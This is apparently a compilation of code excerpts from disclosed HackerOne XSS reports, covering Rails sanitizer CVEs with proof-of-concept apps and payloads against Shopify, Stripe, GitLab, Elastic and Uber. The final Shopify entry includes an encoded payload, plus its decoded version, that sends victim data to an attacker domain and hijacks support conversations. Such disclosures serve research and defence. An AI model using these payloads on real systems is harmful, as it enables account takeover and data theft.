## #1805899 CVE-2022-23519: Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style) — ibb — $2,400 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2023/1805899.md` (https://hackerone.com/reports/1805899)

```
irb(main):016:0> require 'rails-html-sanitizer'
=> false
irb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>", tags: ["svg", "style"]).to_s
=> "<svg><style><script>alert(1)</script></style></svg>"
irb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
=> "<math><style><img src=x onerror=alert(1)></style></math>"
irb(main):019:0> puts Rails::Html::Sanitizer::VERSION
1.4.3
=> nil 
```

```
FROM ruby:3.1.2

RUN apt-get update && apt-get install -y vim

WORKDIR /usr/src/app
RUN gem install rails && rails new myapp
WORKDIR /usr/src/app/myapp


COPY build-rails-app.sh ./build-rails-app.sh
RUN sh ./build-rails-app.sh
RUN RAILS_ENV=production rails assets:precompile

CMD ["./bin/rails", "server", "-b", "0.0.0.0", "-e", "production"]
```

```
#!/ibn/sh

# make routes
cat << EOF > ./config/routes.rb
Rails.application.routes.draw do
  get "/poc1", to: "poc1#index"
  get "/poc2", to: "poc2#index"
end
EOF

# make Poc1 endpoint
# http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E
bin/rails generate controller Poc1 index --skip-routes

cat << EOF > ./app/controllers/poc1_controller.rb
class Poc1Controller < ApplicationController
  def index
    @name = params[:name] || "put your name here"
  end
end
EOF


cat << EOF > ./app/views/poc1/index.html.erb
<h1> Hello <%= sanitize @name, tags: ["svg", "style"] %> </h1>
<br>
PoC with a sanitized, reflected parameter 'name' for which 'svg' annd 'style' tags are allowed.
<br>
<%= link_to "Go to PoC", "/poc1?name=<svg><style><script>alert(1)</script></style><svg>" %>
<br>
<br>
Using: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>
EOF


# make Poc2 endpoint
# http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E
bin/rails generate controller Poc2 index --skip-routes

cat << EOF > ./app/controllers/poc2_controller.rb
class Poc2Controller < ApplicationController
  def index
    @name = params[:name] || "put your name here"
  end
end
EOF


cat << EOF > ./app/views/poc2/index.html.erb
<h1> Hello <%= sanitize @name, tags: ["math", "style"] %> </h1>
<br>
PoC with a sanitized, reflected parameter 'name' for which 'math' annd 'style' tags are allowed.
<br>
<%= link_
```

## #1805893  CVE-2022-23520: Incomplete fix for CVE-2022-32209 (XSS in Rails::Html::Sanitizer under certain configurations) — ibb — $2,400 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2023/1805893.md` (https://hackerone.com/reports/1805893)

```
module Rails
  module Html
    class SafeListSanitizer < Sanitizer
      ...
      def remove_safelist_tag_combinations(tags)
        if !loofah_using_html5? && tags.include?("select") && tags.include?("style")
          warn("WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'")
          tags.delete("style")
        end
        tags
      end

      def allowed_tags(options)
        if options[:tags]
          remove_safelist_tag_combinations(options[:tags])
        else
          self.class.allowed_tags
        end
      end
      ...
    end
  end
end
```

```
    class SafeListSanitizer < Sanitizer
      ...
      def remove_safelist_tag_combinations(tags)
        if !loofah_using_html5? && tags.include?("select") && tags.include?("style")
          warn("WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'")
          tags.delete("style")
        end
        tags
      end
```

```
      def allowed_tags(options)
        if options[:tags]
          remove_safelist_tag_combinations(options[:tags])
        else
          self.class.allowed_tags
        end
      end
      ...
    end
```

## #1599573 Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag — ibb — $2,400 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2022/1599573.md` (https://hackerone.com/reports/1599573)

```
tags = %w(select style)
puts "------------------------------------------------------------------"
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
puts "input: <select<style/>W<xmp<script>alert(1)</script>"
puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
puts "------------------------------------------------------------------"
```

```
input: <select<style/>W<xmp<script>alert(1)</script>
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :W
scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :&lt;script&gt;alert(1)&lt;/script&gt;
scrub --> node type :Nokogiri::XML::Element, node name :xmp, node to_s :<xmp>&lt;script&gt;alert(1)&lt;/script&gt;</xmp>
scrub --> node type :Nokogiri::XML::Element, node name :style, node to_s :<style>W<script>alert(1)</script></style>
scrub --> node type :Nokogiri::XML::Element, node name :select, node to_s :<select><style>W<script>alert(1)</script></style></select>
output: <select><style>W<script>alert(1)</script></style></select>
```

```
frag = "<select><style><script>alert(1)</script></style></select>"
tags = %w(select style)
puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
```

## #709336 Reflective Cross-site Scripting via Newsletter Form — shopify — $2,000 — Cross-site Scripting (XSS) - Reflected
Source: `hackerone/reports/2019/709336.md` (https://hackerone.com/reports/709336)

```
https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

## #1823216 XSS vulnerability without a content security bypass in a `CUSTOM` App through Button tag — stripe — $2,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2023/1823216.md` (https://hackerone.com/reports/1823216)

```
import { Box, ContextView, Inline, Link } from "@stripe/ui-extension-sdk/ui";
import type { ExtensionContextValue } from "@stripe/ui-extension-sdk/context";
import {Button} from '@stripe/ui-extension-sdk/ui';
import {Img} from '@stripe/ui-extension-sdk/ui'
import {Chip, ChipList} from '@stripe/ui-extension-sdk/ui';

import BrandIcon from "./brand_icon.svg";

/**
 * This is a view that is rendered in the Stripe dashboard's customer detail page.
 * In stripe-app.json, this view is configured with stripe.dashboard.customer.detail viewport.
 * You can add a new view by running "stripe apps add view" from the CLI.
 */

const App = ({ userContext, environment }: ExtensionContextValue) => {
  return (
    <ContextView
      title="XSS POC"
      brandColor="#F6F8FA" // replace this with your brand color
      brandIcon={BrandIcon} // replace this with your brand icon
    >
	  
	  <Button href="javascript://%0aalert(123)">
		XSS with %0a
	  </Button>
	  <Button href="javascript://%0dalert(document.domain)">
		XSS with %0d
	  </Button>
	  
    </ContextView>
  );
};

export default App;
```

```
    <ContextView
      title="XSS POC"
      brandColor="#F6F8FA" // replace this with your brand color
      brandIcon={BrandIcon} // replace this with your brand icon
    >
```

## #262230 Tinymce 2.4.0 — shopify — $2,000 — Cross-site Scripting (XSS) - DOM
Source: `hackerone/reports/2017/262230.md` (https://hackerone.com/reports/262230)

```
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=" target="_blank">Firfox</a>
```

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
```

```
<HTML xmlns: ><audio>
<audio src=wp onerror=alert(0X1)>
```

## #1072868 Stored XSS in repository file viewer — gitlab — $2,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2022/1072868.md` (https://hackerone.com/reports/1072868)

```
<a   
  data-remote="true"
  data-method="get"  
  data-type="script"
  href="/wbowling/wiki/raw/master/test.js" 
  class='atwho-view select2-drop-mask pika-select'>
</a>  
```

## #859333 Stored XSS in group issue list — gitlab — $2,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2020/859333.md` (https://hackerone.com/reports/859333)

```
root@gitlab:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.26.2
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.10.1
Revision:	e658772bd63
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	12.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## #846905 Stored XSS in Elastic App Search — elastic — $2,000 — Cross-site Scripting (XSS) - Stored
Source: `hackerone/reports/2020/846905.md` (https://hackerone.com/reports/846905)

```
{
"url":"javascript://test%0aalert(document.domain)"
}
```

## #134061 Reflected XSS via Livefyre Media Wall in newsroom.uber.com — uber — $2,000 — Cross-site Scripting (XSS) - Generic
Source: `hackerone/reports/2016/134061.md` (https://hackerone.com/reports/134061)

```
lf-content=controlled-domain:GET parameter 'collection_id':GET parameter 'content_id'
```

```
https://bootstrap.controlled-domain/api/v3.0/content/thread/?collection_id=GET+parameter+'collection_id'&content_id=GET+parameter+'content_id'&depth_only=false
```

```
{
  "status": "ok",
  "code": 200,
  "data": {
    "content": [
      {
        "source": 0,
        "collectionId": "131560603",
        "content": {
          "generator": {
            "id": "livefyre.com"
          },
          "bodyHtml": "<marquee>XSS</marquee><script>alert(\"XSS on \"+ document.domain)</script>",
          "annotations": {
            "likedBy": [
              "54c1e33eb841b37995000d5d@engadget.fyre.co"
            ]
          },
          "authorId": "50782a81bc6bf341d3002b97@engadget.fyre.co",
          "createdAt": 1431144598,
          "parentId": "307291329",
          "updatedAt": 1431144598,
          "id": "307477931",
          "ancestorId": "307291329"
        },
        "vis": 1,
        "type": 0,
        "event": 1431269111210110
      }
    ],
    "meta": {
      "page": 0
    },
    "authors": {
      "50782a81bc6bf341d3002b97@engadget.fyre.co": {
        "displayName": "MDV",
        "tags": [],
        "profileUrl": "https://hackerone.com/mdv",
        "avatar": "https://bootstrap.danylod.com/mdv.png",
        "type": 1,
        "id": "50782a81bc6bf341d3002b97@engadget.fyre.co"
      }
    }
  }
}
```

## #2509022 Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering — shopify — $1,600 — Cross-site Scripting (XSS) - Reflected
Source: `hackerone/reports/2026/2509022.md` (https://hackerone.com/reports/2509022)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify Search Form</title>
</head>
<body>
    Please hold...
    
    <form id="post-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">
        <input type="hidden" name="query" value="Is this XSS?">
        <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...](javascript:eval(atob('ZmV0Y2goYC8v████████/JHtKU09OLnN0cmluZ2lmeSh3aW5kb3cuX19yZW1peENvbnRleHQuc3RhdGUubG9hZGVyRGF0YS5yb290LnVzZXJJbmZvKX1gKTsgZmV0Y2goIi9tZXNzYWdlcy9ncmFwaHFsIiwgeyAiaGVhZGVycyI6IHsgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIngtc2hvcGlmeS1yZWFjdC14aHIiOiAiMSIgfSwgImJvZHkiOiBgeyJ2YXJpYWJsZXMiOnt9LCJxdWVyeSI6InF1ZXJ5IGNvbnZzIHsgY29udmVyc2F0aW9ucyhmaXJzdDogMTAwKSB7IGVkZ2VzIHsgbm9kZSB7IGlkIH0gfSB9IH0ifWAsICJtZXRob2QiOiAiUE9TVCIgfSkgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKSAudGhlbihkYXRhID0+IHsgY29uc3QgY2lkID0gSlNPTi5wYXJzZShkYXRhKS5kYXRhLmNvbnZlcnNhdGlvbnMuZWRnZXNbMF0ubm9kZS5pZCA/PyBudWxsOyBmZXRjaCgiL21lc3NhZ2VzL2dyYXBocWwiLCB7ICJoZWFkZXJzIjogeyAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAieC1zaG9waWZ5LXJlYWN0LXhociI6ICIxIiB9LCAiYm9keSI6IGB7InZhcmlhYmxlcyI6e30sInF1ZXJ5IjoibXV0YXRpb24gc3Vic2NyaWJlckNyZWF0ZSB7IHN1YnNjcmliZXJDcmVhdGUoY29udmVyc2F0aW9uSWQ6IFxcIiR7Y2lkfVxcIiwgZW1haWw6IFxcInNhbHR5bWVybWFpZEB3ZWFyZWhhY2tlcm9uZS5jb21cXCIpIHsgX190eXBlbmFtZSB9fSJ9YCwg
```

```
// At worst, if no support conversation exists, we leak victims' PII to attacker's controlled domain
fetch(`//████████?${JSON.stringify(window.__remixContext.state.loaderData.root.userInfo)}`);

// Fetch victim's last support inbox conversation.
fetch("/messages/graphql", {
  "headers": {
	"content-type": "application/json",
	"x-shopify-react-xhr": "1"
  },
  "body": `{\"variables\":{},\"query\":\"query convs { conversations(last: 1) { edges { node { id } } } }\"}`,
  "method": "POST"
})
.then(response => response.text())
.then(data => {

   // Try to subscribe to the victim's conversation which will send an email to the attacker and allow him to join the conversation
	const cid = JSON.parse(data).data.conversations.edges[0].node.id ?? null;
	fetch("/messages/graphql", {
	  "headers": {
		"content-type": "application/json",
		"x-shopify-react-xhr": "1"
	  },
	  "body": `{\"variables\":{},\"query\":\"mutation subscriberCreate { subscriberCreate(conversationId: \\\\"${cid}\\\\", email: \\\\"saltymermaid@wearehackerone.com\\\\") { __typename }}\"}`,
	  "method": "POST"
	});

});
```

```
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify Search Form</title>
```

